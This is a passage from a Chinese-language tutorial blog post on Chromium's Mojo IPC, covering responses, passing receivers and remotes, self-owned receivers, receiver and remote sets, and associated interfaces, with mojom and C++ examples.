"</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;sample::mojom::Logger&gt; receiver_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(LoggerImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们可以使用<code>PendingReceiver&lt;Logger&gt;</code>来构造出一个LoggerImpl,<code>LoggerImpl impl(std::move(receiver));</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-083538.jpg" alt=""></p><h5 id="Receiving-Responses"><a href="#Receiving-Responses" class="headerlink" title="Receiving Responses"></a>Receiving Responses</h5><p>一些mojom接口需要response，我们修改Logger接口，从而获取最后一个Log行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module sample.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">  GetTail() &#x3D;&gt; (string message);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在生成的c++ interface是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> sample &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Logger() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">using</span> GetTailCallback = base::OnceCallback&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)&gt;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">GetTail</span><span class="params">(GetTailCallback callback)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace sample</span></span><br></pre></td></tr></table></figure><p>和之前一样，此接口的client和implement对GetTail都使用相同的函数签名:implement使用callback参数去对请求进行响应，而client传递callback参数来异步接收响应，现在的implement是这样的:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> A common pattern for interface implementations which have one</span></span><br><span class="line">  <span class="comment">// instance per client is to take a PendingReceiver in the constructor.</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LoggerImpl</span><span class="params">(mojo::PendingReceiver&lt;sample::mojom::Logger&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~Logger() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">    lines_.push_back(message);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetTail</span><span class="params">(GetTailCallback callback)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(lines_.back());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;sample::mojom::Logger&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; lines_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(LoggerImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在client可以这样调用GetTail</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnGetTail</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>&#123;</span><br><span class="line">  LOG(ERROR) &lt;&lt; <span class="string">"Tail was: "</span> &lt;&lt; message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger-&gt;GetTail(base::BindOnce(&amp;OnGetTail));</span><br></pre></td></tr></table></figure><h4 id="Sending-Interfaces-Over-Interfaces"><a href="#Sending-Interfaces-Over-Interfaces" class="headerlink" title="Sending Interfaces Over Interfaces"></a>Sending Interfaces Over Interfaces</h4><p>我们知道如何创建接口管道,并以一些有趣的方式使用它们的Remote和PendingReceiver端点。这仍然不构成有趣的IPC!Mojo IPC的主要功能是能够跨其他接口传输接口端点，因此让我们看一下如何实现这一点。</p><h5 id="Sending-Pending-Receivers"><a href="#Sending-Pending-Receivers" class="headerlink" title="Sending Pending Receivers"></a>Sending Pending Receivers</h5><p>考虑如下Mojom</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module db.mojom;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  void AddRow(int32 key, string data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Database &#123;</span><br><span class="line">  AddTable(pending_receiver&lt;Table&gt; table);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pending_receiver&lt;Table&gt;</code>对应c++里的<code>PendingReceiver&lt;T&gt;</code>类型，并且为这个mojom生成类似如下的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> db &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Table() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Database() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddTable</span><span class="params">(mojo::PendingReceiver&lt;Table&gt; table)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace db</span></span><br></pre></td></tr></table></figure><p>其对应的implemention如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/db.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom:Table &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">TableImpl</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Table&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~TableImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Table:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    rows_.insert(&#123;key, data&#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;db::mojom::Table&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int32_t</span>, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; rows_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseImpl</span> :</span> <span class="keyword">public</span> db::mojom::Database &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">DatabaseImpl</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Database&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~DatabaseImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Database:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddTable</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Table&gt; table)</span> </span>&#123;</span><br><span class="line">    tables_.emplace_back(<span class="built_in">std</span>::make_unique&lt;TableImpl&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(table)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;db::mojom::Database&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;TableImpl&gt;&gt; tables_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pending_receiver&lt;Table&gt;</code>参数对应的是一个强类型的message pipe handle，当DatabaseImpl接收到一个AddTable消息时，它构造一个新的<code>TableImpl</code>实例，并且将其绑定到接收到的<code>mojo::PendingReceiver&lt;db::mojom::Table&gt;</code><br>让我们看一下具体的用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;db::mojom::Database&gt; database;</span><br><span class="line"><span class="function">DatabaseImpl <span class="title">db_impl</span><span class="params">(database.BindNewPipeAndPassReceiver())</span></span>;</span><br><span class="line"></span><br><span class="line">mojo::Remote&lt;db::mojom::Table&gt; table1, table2;</span><br><span class="line">database-&gt;AddTable(table1.BindNewPipeAndPassReceiver());</span><br><span class="line">database-&gt;AddTable(table2.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line">table1-&gt;AddRow(<span class="number">1</span>, <span class="string">"hiiiiiiii"</span>);</span><br><span class="line">table2-&gt;AddRow(<span class="number">2</span>, <span class="string">"heyyyyyy"</span>);</span><br></pre></td></tr></table></figure><p>请注意，即使它们的<code>mojo::PendingReceiver&lt;db::mojom::Table&gt;</code>端点仍在传输中，我们也可以立即立即开始使用新的Table管道。</p><h5 id="Sending-Remote"><a href="#Sending-Remote" class="headerlink" title="Sending Remote"></a>Sending Remote</h5><p>当然我们也可以发送Remotes</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface TableListener &#123;</span><br><span class="line">  OnRowAdded(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, <span class="built_in">string</span> data);</span><br><span class="line"></span><br><span class="line">  AddListener(pending_remote&lt;TableListener&gt; listener);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>生成这样的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddListener</span><span class="params">(mojo::PendingRemote&lt;TableListener&gt; listener)</span> </span>= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>使用起来是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mojo::PendingRemote&lt;db::mojom::TableListener&gt; listener;</span><br><span class="line"><span class="function">TableListenerImpl <span class="title">impl</span><span class="params">(listener.InitWithNewPipeAndPassReceiver())</span></span>;</span><br><span class="line">table-&gt;AddListener(<span class="built_in">std</span>::<span class="built_in">move</span>(listener));</span><br></pre></td></tr></table></figure><h4 id="Other-Interface-Binding-Types"><a href="#Other-Interface-Binding-Types" class="headerlink" title="Other Interface Binding Types"></a>Other Interface Binding Types</h4><h5 id="Self-owned-Receivers"><a href="#Self-owned-Receivers" class="headerlink" title="Self-owned Receivers"></a>Self-owned Receivers</h5><p>self-owned的receiver作为一个独立的object存在，它拥有一个std::unique_ptr指向其绑定的interface implemention，并且在MessagePipe被关闭或者发生一些错误时，负责任的去delete implemention，所以其将一个interface implemention和MessagePipe绑定到了一起。<br>MakeSelfOwnedReceiver函数被用于创建这样的receiver</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  LoggerImpl() &#123;&#125;</span><br><span class="line">  ~LoggerImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> This doesn't own any Receiver object!</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">mojo::Remote&lt;db::mojom::Logger&gt; logger;</span><br><span class="line">mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;LoggerImpl&gt;(),</span><br><span class="line">                        logger.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line">logger-&gt;Log(<span class="string">"NOM NOM NOM MESSAGES"</span>);</span><br></pre></td></tr></table></figure><p>只要logger在系统中的某个位置保持open状态，在另一端绑定的LoggerImpl将存活。</p><h5 id="Receiver-Sets"><a href="#Receiver-Sets" class="headerlink" title="Receiver Sets"></a>Receiver Sets</h5><p>在多个client共享同一个implement实例的时候使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module system.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface LoggerProvider &#123;</span><br><span class="line">  GetLogger(Logger&amp; logger);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如此我们就可以使用ReceiverSet去绑定多个Looger pending receiver到单个implement实例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogManager</span> :</span> <span class="keyword">public</span> system::mojom::LoggerProvider,</span><br><span class="line">                   <span class="keyword">public</span> system::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LogManager</span><span class="params">(mojo::PendingReceiver&lt;system::mojom::LoggerProvider&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">provider_receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~LogManager() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// system::mojom::LoggerProvider:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetLogger</span><span class="params">(mojo::PendingReceiver&lt;Logger&gt; receiver)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    logger_receivers_.Add(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// system::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;system::mojom::LoggerProvider&gt; provider_receiver_;</span><br><span class="line">  mojo::ReceiverSet&lt;system::mojom::Logger&gt; logger_receivers_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="Remote-Sets"><a href="#Remote-Sets" class="headerlink" title="Remote Sets"></a>Remote Sets</h5><p>同理，有时维护一组Remotes很有用，例如一组观察某些事件的client。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> db.mojom;</span><br><span class="line"></span><br><span class="line">interface TableListener &#123;</span><br><span class="line">  OnRowAdded(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">  AddListener(pending_remote&lt;TableListener&gt; listener);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Table的实现可能是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom::Table &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  TableImpl() &#123;&#125;</span><br><span class="line">  ~TableImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Table:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    rows_.insert(&#123;key, data&#125;);</span><br><span class="line">    listeners_.ForEach([key, &amp;data](db::mojom::TableListener* listener) &#123;</span><br><span class="line">      listener-&gt;OnRowAdded(key, data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddListener</span><span class="params">(mojo::PendingRemote&lt;db::mojom::TableListener&gt; listener)</span> </span>&#123;</span><br><span class="line">    listeners_.Add(<span class="built_in">std</span>::<span class="built_in">move</span>(listener));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::RemoteSet&lt;db::mojom::Table&gt; listeners_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int32_t</span>, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; rows_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="Associated-Interfaces"><a href="#Associated-Interfaces" class="headerlink" title="Associated Interfaces"></a>Associated Interfaces</h4><ul><li>允许在message pipe上运行多个interface，同时保留message的顺序</li><li>使receiver可以从多个sequence访问单个message pipe<h5 id="Mojom"><a href="#Mojom" class="headerlink" title="Mojom"></a>Mojom</h5>引入新的类型pending_associated_remote和pending_associated_receiver<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">interface Bar &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qux</span> &#123;</span></span><br><span class="line">  pending_associated_remote&lt;Bar&gt; bar;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Foo &#123;</span><br><span class="line">  <span class="comment">// Uses associated remote.</span></span><br><span class="line">  PassBarRemote(pending_associated_remote&lt;Bar&gt; bar);</span><br><span class="line">  <span class="comment">// Uses associated receiver.</span></span><br><span class="line">  PassBarReceiver(pending_associated_receiver&lt;Bar&gt; bar);</span><br><span class="line">  <span class="comment">// Passes a struct with associated interface pointer.</span></span><br><span class="line">  PassQux(Qux qux);</span><br><span class="line">  <span class="comment">// Uses associated interface pointer in callback.</span></span><br><span class="line">  AsyncGetBar() =&gt; (pending_associated_remote&lt;Bar&gt; bar);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>在每个interface impl/client将使用相同的message pipe，通过传递associated remote/receiver进行通信</li></ul><h5 id="Passing-pending-associated-receivers"><a href="#Passing-pending-associated-receivers" class="headerlink" title="Passing pending associated receivers"></a>Passing pending associated receivers</h5><p>假设你已经有了一个<code>Remote&lt;Foo&gt; foo</code>，你想要去call <code>PassBarReceiver</code>，你可以这样:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; pending_bar;</span><br><span class="line">mojo::PendingAssociatedReceiver&lt;Bar&gt; bar_receiver = pending_bar.InitWithNewEndpointAndPassReceiver();</span><br><span class="line">foo-&gt;PassBarReceiver(<span class="built_in">std</span>::<span class="built_in">move</span>(bar_receiver));</span><br><span class="line"></span><br><span class="line">mojo::AssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">bar.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(pending_bar));</span><br><span class="line">bar-&gt;DoSomething();</span><br></pre></td></tr></table></figure><p>首先代码创建一个Bar类型的associated interface，和之前我们创建的不同在于，associated的两端(bar_receiver和pending_bar)之一，必须通过另一个interface发送，这就是接口和现有message pipe关联的方式。</p><p>应该注意的是，在传递bar_receiver之前不能调用<code>bar-&gt;DoSomething()</code>,需要满足FIFO:<br>在接收方，当DoSomething调用的消息到达时，我们希望在处理任何后续消息之前将其分派到对应的<code>AssociatedReceiver&lt;Bar&gt;</code>，如果bar_receiver在后续的消息里，那么消息调度就将陷入死锁。<br>另一方面，一旦发送了<code>bar_receiver</code>，bar就可以使用，而无须等待bar_receiver绑定到具体的implemention。<br>上面的代码也可以写成这样，包一层语法糖</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mojo::AssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">foo-&gt;PassBarReceiver(bar.BindNewEndpointAndPassReceiver());</span><br><span class="line">bar-&gt;DoSomething();</span><br></pre></td></tr></table></figure><p>Foo的impl实现如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 